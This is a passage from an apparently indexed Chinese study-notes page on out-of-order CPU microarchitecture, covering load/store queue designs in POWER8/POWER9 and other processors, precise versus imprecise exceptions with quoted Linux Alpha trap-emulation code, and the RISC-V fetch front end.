\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u4e0d\u200b\u4f9d\u8d56\u200b Store \u200b\u6307\u4ee4\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u6709\u70b9\u50cf\u200b Cache \u200b\u91cc\u9762\u200b\u7684\u200b Way Prediction \u200b\u673a\u5236\u200b\u3002</p> <p>\u200b\u5206\u6790\u200b\u5b8c\u200b\u4e86\u200b\u4e0a\u8ff0\u200b\u4e00\u4e9b\u200b\u4f18\u5316\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e5f\u200b\u6765\u770b\u200b\u4e00\u4e9b\u200b CPU \u200b\u8bbe\u8ba1\u200b\u91c7\u7528\u200b\u4e86\u200b\u54ea\u79cd\u200b\u65b9\u6848\u200b\u3002\u200b\u9996\u5148\u200b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b IBM POWER8 \u200b\u7684\u200b LSU\uff0c\u200b\u9996\u5148\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u6bd4\u8f83\u200b\u591a\u200b\u9879\u76ee\u200b\u7684\u200b virtual STAG/LTAG\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u8f6c\u6362\u6210\u200b\u6bd4\u8f83\u200b\u5c11\u200b\u9879\u76ee\u200b\u7684\u200b physical STAG/LTAG\uff0c\u200b\u8fd9\u6837\u200b LSQ \u200b\u53ef\u4ee5\u200b\u505a\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u539f\u6587\u200b\uff1a</p> <pre><code>A virtual STAG/LTAG scheme is used to minimize dispatch holds due to\nrunning out of physical SRQ/LRQ entries. When a physical entry in the\nLRQ is freed up, a virtual LTAG will be converted to a real LTAG. When a\nphysical entry in the SRQ is freed up, a virtual STAG will be converted\nto a real STAG. Virtual STAG/LTAGs are not issued to the LSU until they\nare subsequently marked as being real in the UniQueue. The ISU can\nassign up to 128 virtual LTAGs and 128 virtual STAGs to each thread.\n</code></pre> <p>\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\u5728\u200b 2007 \u200b\u5e74\u200b\u7684\u200b\u8bba\u6587\u200b Late-Binding: Enabling Unordered Load-Store Queues \u200b\u91cc\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4e5f\u8bb8\u200b POWER8 \u200b\u53c2\u8003\u200b\u4e86\u200b\u8fd9\u7bc7\u200b\u8bba\u6587\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cPOWER8 \u200b\u6ca1\u6709\u200b\u91c7\u7528\u200b\u90a3\u4e9b\u200b\u514d\u9664\u200b CAM \u200b\u7684\u200b\u65b9\u6848\u200b\uff1a</p> <pre><code>The SRQ is a 40-entry, real address based CAM structure. Similar to the\nSRQ, the LRQ is a 44-entry, real address based, CAM structure. The LRQ\nkeeps track of out-of-order loads, watching for hazards. Hazards\ngenerally exist when a younger load instruction executes out-of-order\nbefore an older load or store instruction to the same address (in part\nor in whole). When such a hazard is detected, the LRQ initiates a flush\nof the younger load instruction and all its subsequent instructions from\nthe thread, without impacting the instructions from other threads. The\nload is then re-fetched from the I-cache and re-executed, ensuring\nproper load/store ordering.\n</code></pre> <p>\u200b\u800c\u662f\u200b\u5728\u200b\u4f20\u7edf\u200b\u7684\u200b\u4e24\u4e2a\u200b CAM \u200b\u8bbe\u8ba1\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u505a\u200b\u4e86\u200b\u51cf\u5c11\u200b\u7269\u7406\u200b LSQ \u200b\u9879\u76ee\u200b\u7684\u200b\u4f18\u5316\u200b\u3002\u200b\u6bd4\u8f83\u200b\u6709\u610f\u601d\u200b\u7684\u200b\u662f\u200b\uff0cPOWER7 \u200b\u548c\u200b POWER8 \u200b\u7684\u200b L1 Cache \u200b\u90fd\u200b\u662f\u200b 8 \u200b\u8def\u7ec4\u200b\u76f8\u8fde\u200b\uff0c\u200b\u5e76\u4e14\u200b\u91c7\u7528\u200b\u4e86\u200b set-prediction \u200b\u7684\u200b\u65b9\u5f0f\u200b\uff08\u200b\u5e94\u8be5\u200b\u662f\u200b\u901a\u5e38\u200b\u8bf4\u200b\u7684\u200b way-prediction\uff09\u3002</p> <p>\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u5b9e\u73b0\u200b\u4e0a\u200b\u7684\u200b\u5c0f\u200b\u7ec6\u8282\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b\u5224\u65ad\u200b Load \u200b\u548c\u200b Store \u200b\u6307\u4ee4\u200b\u662f\u5426\u200b\u6709\u200b\u76f8\u5173\u6027\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5730\u5740\u200b\u4f4d\u6570\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u5b8c\u6574\u200b\u6bd4\u8f83\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u6bd4\u8f83\u200b\u5927\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u727a\u7272\u200b\u7cbe\u5ea6\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\uff0c\u200b\u9009\u53d6\u200b\u5730\u5740\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u8fdb\u884c\u200b\u6bd4\u8f83\u200b\u3002POWER9 \u200b\u8bba\u6587\u200b \u200b\u63d0\u5230\u200b\u4e86\u200b\u8fd9\u200b\u4e00\u70b9\u200b\uff1a</p> <pre><code>POWER8 and prior designs matched the effective address (EA) bits 48:63\nbetween the younger load and the older store queue entry. In POWER9,\nthrough a combination of outright matches for EA bits 32:63 and hashed\nEA matches for bits 0:31, false positive avoidance is greatly improved.\nThis reduces the number of flushes, which are compulsory for false\npositives.\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u53c8\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7cbe\u786e\u5ea6\u200b\u548c\u200b\u65f6\u5e8f\u200b\u4e0a\u200b\u7684\u200b\u4e00\u4e2a\u200b tradeoff\u3002</p> <p>\u200b\u5177\u4f53\u200b\u5230\u200b Load/Store Queue \u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5176\u5b9e\u200b\u90fd\u200b\u4e0d\u5927\u200b\uff1a</p> <ol> <li>Zen 2 Store Queue 48</li> <li>Intel Skylake Store Buffer 56 Load Buffer 72</li> <li>POWER 8 Store Queue 40 Load Queue 44 (Virtual 128+128)</li> <li>Alpha 21264 Store Queue 32 Load Queue 32</li> </ol>"},{"location":"hardware/ooo_cpu.html#vs","title":"\u7cbe\u786e\u200b\u5f02\u5e38\u200b vs \u200b\u975e\u200b\u7cbe\u786e\u200b\u5f02\u5e38","text":"<p>\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u662f\u200b\u6307\u200b\u53d1\u751f\u200b\u5f02\u5e38\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e4b\u524d\u200b\u7684\u200b\u6307\u4ee4\u200b\u90fd\u200b\u5b8c\u6210\u200b\uff0c\u200b\u4e4b\u540e\u200b\u7684\u200b\u6ca1\u6709\u200b\u6267\u884c\u200b\u3002\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u662f\u200b\u5b8c\u6210\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b\u4e4b\u524d\u200b\u7684\u200b\u6240\u6709\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5e76\u200b\u64a4\u9500\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b\u4e4b\u540e\u200b\u7684\u200b\u6307\u4ee4\u200b\u7684\u200b\u4f5c\u7528\u200b\u3002\u200b\u975e\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u5219\u200b\u662f\u200b\u4e0d\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e2a\u200b\u6027\u8d28\u200b\uff0c\u200b\u7f51\u4e0a\u200b\u8d44\u6599\u200b \u200b\u8bf4\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u7b80\u5355\u200b\uff0c\u200b\u4f46\u662f\u200b\u8f6f\u4ef6\u200b\u4e0a\u200b\u5904\u7406\u200b\u6bd4\u8f83\u200b\u56f0\u96be\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u975e\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u7684\u200b\u4f8b\u5b50\u200b\u662f\u200b Alpha\uff0c\u200b\u5728\u200b\u7ae0\u8282\u200b 4.7.6.1 \u200b\u4e2d\u200b\u63d0\u5230\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u5f02\u5e38\u200b\u53ef\u80fd\u200b\u662f\u975e\u200b\u7cbe\u786e\u200b\u7684\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8bf4\u200b\u4e86\u200b\u4e00\u53e5\u200b\uff1a<code>In general, it is not feasible to fix up the result value or to continue from the trap.</code>\u3002\u200b\u540c\u65f6\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u6761\u4ef6\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\u6ee1\u8db3\u200b\u8fd9\u4e9b\u200b\u6761\u4ef6\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5f02\u5e38\u200b\u624d\u200b\u662f\u200b\u53ef\u4ee5\u200b\u6062\u590d\u200b\u7684\u200b\u3002\u200b\u8fd8\u6709\u200b\u4e00\u6bb5\u200b\u63cf\u8ff0\u200b\uff0c\u200b\u6458\u5f55\u200b\u5728\u200b\u8fd9\u91cc\u200b\uff1a</p> <pre><code>Alpha lets the software implementor determine the precision of\narithmetic traps.  With the Alpha architecture, arithmetic traps (such\nas overflow and underflow) are imprecise\u2014they can be delivered an\narbitrary number of instructions after the instruction that triggered\nthe trap. Also, traps from many different instructions can be reported\nat once. That makes implementations that use pipelining and multiple\nissue substantially easier to build.  However, if precise arithmetic\nexceptions are desired, trap barrier instructions can be explicitly\ninserted in the program to force traps to be delivered at specific\npoints.\n</code></pre> <p>\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0c\u200b\u5728\u200b Reference Manual \u200b\u4e2d\u200b\u7b2c\u200b 5.4.1 \u200b\u7ae0\u8282\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5f53\u200b\u89e6\u53d1\u200b Arithmetic Trap \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u8fdb\u5165\u200b Kernel \u200b\u7684\u200b entArith \u200b\u51fd\u6570\u200b\uff0c\u200b\u5e76\u200b\u63d0\u4f9b\u200b\u53c2\u6570\u200b\uff1aa0 \u200b\u8868\u793a\u200b exception summary\uff0ca1 \u200b\u8868\u793a\u200b register write mask\u3002exception summary \u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u5224\u65ad\u200b\u53d1\u751f\u200b\u4e86\u200b\u4ec0\u4e48\u200b\u7c7b\u578b\u200b\u7684\u200b exception\uff0c\u200b\u6bd4\u5982\u200b integer overflow\uff0cinexact result \u200b\u7b49\u7b49\u200b\u3002\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\u7684\u200b exception \u200b\u7c7b\u578b\u200b\u662f\u200b software completion\u3002\u200b\u7b2c\u4e8c\u4e2a\u200b\u53c2\u6570\u200b\u8868\u793a\u200b\u7684\u200b\u662f\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\u7684\u200b\u6307\u4ee4\u200b\uff08\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\uff09\u200b\u4f1a\u200b\u5199\u5165\u200b\u54ea\u4e9b\u200b\u5bc4\u5b58\u5668\u200b\uff0864 \u200b\u4f4d\u200b\uff0c\u200b\u4f4e\u200b 32 \u200b\u4f4d\u200b\u5bf9\u5e94\u200b\u6574\u6570\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u9ad8\u200b 32 \u200b\u4f4d\u200b\u5bf9\u5e94\u200b\u6d6e\u70b9\u200b\u5bc4\u5b58\u5668\u200b\uff09\uff0c\u200b\u7136\u540e\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\u7684\u200b PC \u200b\u503c\u4e3a\u200b\u6700\u540e\u200b\u4e00\u6761\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5730\u5740\u200b\uff0c\u200b\u4ece\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\u7684\u200b\u7b2c\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5230\u200b\u6700\u540e\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5c31\u662f\u200b trap shadow\uff0c\u200b\u8fd9\u90e8\u5206\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u6267\u884c\u200b\u4e86\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u6ca1\u6709\u200b\u6267\u884c\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u4e00\u90e8\u5206\u200b\u6267\u884c\u200b\u7ed3\u679c\u200b\u662f\u200b\u9519\u8bef\u200b\u7684\u200b\u3002</p> <p>Linux \u200b\u5904\u7406\u200b\u4ee3\u7801\u200b\u5728\u200b <code>arch/alpha/kernel/traps.c</code> \u200b\u7684\u200b <code>do_entArith</code> \u200b\u51fd\u6570\u200b\u4e2d\u200b\u3002\u200b\u9996\u5148\u200b\u5224\u65ad\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b software completion\uff0c\u200b\u90a3\u200b\u5c31\u8981\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\uff1b\u200b\u5426\u5219\u200b\u76f4\u63a5\u200b SIGFPE \u200b\u8ba9\u200b\u7a0b\u5e8f\u200b\u81ea\u5df1\u200b\u5904\u7406\u200b\u6216\u8005\u200b\u9000\u51fa\u200b\u3002\u200b\u5982\u679c\u200b\u662f\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5bf9\u200b PC-4 \u200b\u8fdb\u884c\u200b\u6d6e\u70b9\u200b\u6a21\u62df\u200b\uff1b\u200b\u5982\u679c\u200b\u662f\u975e\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b trap shadow \u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5f00\u59cb\u200b\u5f80\u524d\u200b\u641c\u7d22\u200b\uff0c\u200b\u5e76\u200b\u540c\u65f6\u200b\u8bb0\u5f55\u200b\u9047\u5230\u200b\u7684\u200b\u6307\u4ee4\u200b\u5199\u5165\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b\u6307\u4ee4\u200b\u7684\u200b\u5199\u5165\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5df2\u7ecf\u200b\u8986\u76d6\u200b\u4e86\u200b register write mask\uff0c\u200b\u5c31\u200b\u8bf4\u660e\u200b\u627e\u5230\u200b\u4e86\u200b trap shadow \u200b\u7684\u200b\u5f00\u5934\u200b\uff0c\u200b\u5219\u200b\u6a21\u62df\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u7136\u540e\u200b\u4ece\u4e0b\u200b\u4e00\u6761\u200b\u5f00\u59cb\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b\u3002\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>long\nalpha_fp_emul_imprecise (struct pt_regs *regs, unsigned long write_mask)\n{\n    unsigned long trigger_pc = regs-&gt;pc - 4;\n    unsigned long insn, opcode, rc, si_code = 0;\n\n    /*\n     * Turn off the bits corresponding to registers that are the\n     * target of instructions that set bits in the exception\n     * summary register.  We have some slack doing this because a\n     * register that is the target of a trapping instruction can\n     * be written at most once in the trap shadow.\n     *\n     * Branches, jumps, TRAPBs, EXCBs and calls to PALcode all\n     * bound the trap shadow, so we need not look any further than\n     * up to the first occurrence of such an instruction.\n     */\n    while (write_mask) {\n        get_user(insn, (__u32 __user *)(trigger_pc));\n        opcode = insn &gt;&gt; 26;\n        rc = insn &amp; 0x1f;\n\n        switch (opcode) {\n              case OPC_PAL:\n              case OPC_JSR:\n              case 0x30 ... 0x3f:   /* branches */\n            goto egress;\n\n              case OPC_MISC:\n            switch (insn &amp; 0xffff) {\n                  case MISC_TRAPB:\n                  case MISC_EXCB:\n                goto egress;\n\n                  default:\n                break;\n            }\n            break;\n\n              case OPC_INTA:\n              case OPC_INTL:\n              case OPC_INTS:\n              case OPC_INTM:\n            write_mask &amp;= ~(1UL &lt;&lt; rc);\n            break;\n\n              case OPC_FLTC:\n              case OPC_FLTV:\n              case OPC_FLTI:\n              case OPC_FLTL:\n            write_mask &amp;= ~(1UL &lt;&lt; (rc + 32));\n            break;\n        }\n        if (!write_mask) {\n            /* Re-execute insns in the trap-shadow.  */\n            regs-&gt;pc = trigger_pc + 4;\n            si_code = alpha_fp_emul(trigger_pc);\n            goto egress;\n        }\n        trigger_pc -= 4;\n    }\n\negress:\n    return si_code;\n}\n</code></pre> <p>ARM \u200b\u67b6\u6784\u200b\u4e5f\u200b\u6709\u200b imprecise asynchronous external abort\uff1a</p> <pre><code>Normally, external aborts are rare. An imprecise asynchronous external\nabort is likely to be fatal to the process that is running. An example\nof an event that might cause an external abort is an uncorrectable\nparity or ECC failure on a Level 2 Memory structure.\n\nBecause imprecise asynchronous external aborts are normally fatal to the\nprocess that caused them, ARM recommends that implementations make\nexternal aborts precise wherever possible.\n</code></pre> <p>\u200b\u4e0d\u8fc7\u200b\u8fd9\u200b\u66f4\u200b\u591a\u200b\u662f\u56e0\u4e3a\u200b\u5185\u5b58\u200b\u7684\u200b\u65e0\u6cd5\u200b\u9884\u77e5\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65f6\u5019\u200b\u673a\u5668\u200b\u76f4\u63a5\u200b\u53ef\u4ee5\u200b\u62ff\u200b\u53bb\u200b\u7ef4\u4fee\u200b\u4e86\u200b\u3002</p> <p>\u200b\u6587\u7ae0\u200b \u200b\u63d0\u5230\u200b\u4e86\u200b\u4e24\u4e2a\u200b precise/imprecise async/sync\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <ol> <li>\u200b\u5916\u90e8\u200b\u4e2d\u65ad\u200b\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u662f\u200b precise \u200b\u7684\u200b\u3002</li> <li>\u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b Write-allocate \u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5982\u679c\u200b\u7a0b\u5e8f\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b\u4e0d\u200b\u5b58\u5728\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5199\u5165\u200b\u7f13\u5b58\u200b\u7684\u200b\u65f6\u5019\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u200b\u5f53\u200b\u8fd9\u4e2a\u200b cache line \u200b\u88ab\u200b\u5199\u5165\u200b\u5230\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5f02\u5e38\u200b\u662f\u200b\u5f02\u6b65\u200b\u5e76\u4e14\u200b\u975e\u200b\u7cbe\u786e\u200b\u7684\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4e4b\u524d\u200b\u89e6\u53d1\u200b\u8fd9\u4e2a\u200b\u5f02\u5e38\u200b\u7684\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u5df2\u7ecf\u200b\u5b8c\u6210\u200b\u5f88\u4e45\u200b\u4e86\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65f6\u5019\u200b\u8fd9\u4e2a\u200b\u8fdb\u7a0b\u200b\u4e5f\u200b\u5927\u200b\u6982\u7387\u200b\u6ca1\u6551\u200b\u4e86\u200b\uff0c\u200b\u76f4\u63a5\u200b SIGBUS \u200b\u9000\u51fa\u200b\u3002</li> </ol>"},{"location":"hardware/ooo_cpu.html#_3","title":"\u5904\u7406\u5668\u200b\u524d\u7aef","text":"<p>\u200b\u518d\u200b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b\u4e71\u5e8f\u6267\u884c\u200b CPU \u200b\u7684\u200b\u524d\u7aef\u200b\u90e8\u5206\u200b\u3002\u200b\u4ee5\u200b RISC-V \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u6307\u4ee4\u200b\u957f\u5ea6\u200b\u6709\u200b 4 \u200b\u5b57\u8282\u200b\u6216\u8005\u200b 2 \u200b\u5b57\u8282\u200b\u4e24\u79cd\u200b\uff0c\u200b\u5176\u4e2d\u200b 2 \u200b\u5b57\u8282\u200b\u5c5e\u4e8e\u200b\u538b\u7f29\u200b\u6307\u4ee4\u96c6\u200b\u3002\u200b\u5982\u4f55\u200b\u6b63\u786e\u200b\u5e76\u200b\u9ad8\u6548\u200b\u5730\u200b\u8fdb\u884c\u200b\u53d6\u6307\u4ee4\u200b\u8bd1\u7801\u200b\uff1f</p> <p>\u200b\u9996\u5148\u200b\uff0c\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u524d\u7aef\u200b\u80fd\u591f\u200b\u5c3d\u53ef\u80fd\u200b\u5feb\u5730\u200b\u53d6\u6307\u4ee4\u200b\uff0c\u200b\u524d\u7aef\u200b\u7684\u200b\u53d6\u6307\u200b\u80fd\u529b\u200b\u8981\u200b\u548c\u200b\u540e\u200b\u7aef\u200b\u5339\u914d\u200b\uff0c\u200b\u6bd4\u5982\u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b\u56db\u200b\u53d1\u5c04\u200b\u7684\u200b CPU\uff0c\u200b\u524d\u7aef\u200b\u5bf9\u5e94\u200b\u5730\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u53d6\u200b <code>4*4=16</code> \u200b\u5b57\u8282\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u8fd9\u200b 16 \u200b\u5b57\u8282\u200b\u53ef\u80fd\u200b\u662f\u200b 4 \u200b\u6761\u975e\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u662f\u200b 8 \u200b\u6761\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u662f\u200b\u6df7\u5408\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002\u200b\u6240\u4ee5\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u6307\u4ee4\u200b\u6761\u6570\u200b\u4e0d\u200b\u5339\u914d\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e2d\u95f4\u200b\u53ef\u4ee5\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b Fetch Buffer\uff0c\u200b\u6bd4\u5982\u200b BOOM \u200b\u7684\u200b\u5b9e\u73b0\u200b\u4e2d\u200b\uff0cL1 ICache \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b 16 \u200b\u5b57\u8282\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u884c\u200b\u9884\u200b\u8bd1\u7801\u200b\uff0c\u200b\u51fa\u6765\u200b 8 \u200b\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5230\u200b Fetch Buffer \u200b\u4e2d\u200b\u3002\u200b\u8fd9\u91cc\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u4ee5\u4e0b\u51e0\u70b9\u200b\uff1a\u200b\u9996\u5148\u200b\u4ece\u200b ICache \u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b\u5bf9\u9f50\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b PC \u200b\u53ef\u80fd\u200b\u4e0d\u662f\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4e2d\u95f4\u200b\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u5176\u6b21\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4e00\u4e2a\u200b 4 \u200b\u5b57\u8282\u200b\u7684\u200b\u975e\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\u8de8\u8d8a\u200b\u4e86\u200b\u4e24\u6b21\u200b Fetch\uff0c\u200b\u6bd4\u5982\u200b\u524d\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5728\u200b\u524d\u200b\u4e00\u4e2a\u200b Fetch Bundle\uff0c\u200b\u540e\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5728\u200b\u540e\u200b\u4e00\u4e2a\u200b Fetch Bundle\uff1b\u200b\u6b64\u5916\u200b\uff0c\u200b\u6bcf\u4e2a\u200b 2 \u200b\u5b57\u8282\u200b\u7684\u200b\u8fb9\u754c\u200b\u90fd\u200b\u9700\u8981\u200b\u5224\u65ad\u200b\u4e00\u4e0b\u200b\u662f\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\u8fd8\u200b\u662f\u975e\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\u3002\u200b\u4e00\u4e2a\u200b\u975e\u5e38\u200b\u7279\u6b8a\u200b\u7684\u200b\u60c5\u51b5\u200b\u5c31\u662f\u200b\uff0c\u200b\u4e00\u4e2a\u200b 4 \u200b\u5b57\u8282\u200b\u7684\u200b\u6307\u4ee4\u200b\u8de8\u8d8a\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u9875\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e24\u4e2a\u200b\u9875\u200b\u90fd\u200b\u9700\u8981\u200b\u67e5\u8be2\u200b\u9875\u8868\u200b\uff1b\u200b\u5982\u679c\u200b\u6070\u597d\u200b\u5728\u200b\u7b2c\u4e8c\u4e2a\u200b\u9875\u200b\u5904\u200b\u53d1\u751f\u200b\u4e86\u200b\u9875\u200b\u7f3a\u5931\u200b\uff0c\u200b\u6b64\u65f6\u200b epc \u200b\u662f\u200b\u6307\u4ee4\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\uff0c\u200b\u4f46\u200b tval \u200b\u662f\u200b\u7b2c\u4e8c\u4e2a\u200b\u9875\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5185\u6838\u200b\u624d\u200b\u77e5\u9053\u200b\u662f\u200b\u54ea\u4e2a\u200b\u9875\u200b\u53d1\u751f\u200b\u4e86\u200b\u7f3a\u5931\u200b\u3002</p> <p>\u200b\u5176\u6b21\u200b\uff0c\u200b\u9700\u8981\u200b\u914d\u5408\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u6b63\u786e\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u80fd\u591f\u200b\u5728\u200b\u5faa\u73af\u200b\u4e2d\u200b\u8fbe\u5230\u200b\u63a5\u8fd1\u200b 100% \u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5728\u200b Fetch \u200b\u5206\u652f\u200b\u7ed3\u5c3e\u200b\u7684\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u4e0b\u200b\u4e00\u6b21\u200b Fetch \u200b\u5df2\u7ecf\u200b\u5f97\u5230\u200b\u4e86\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u5c31\u662f\u200b BOOM \u200b\u91cc\u9762\u200b\u7684\u200b L0 BTB (1-cycle 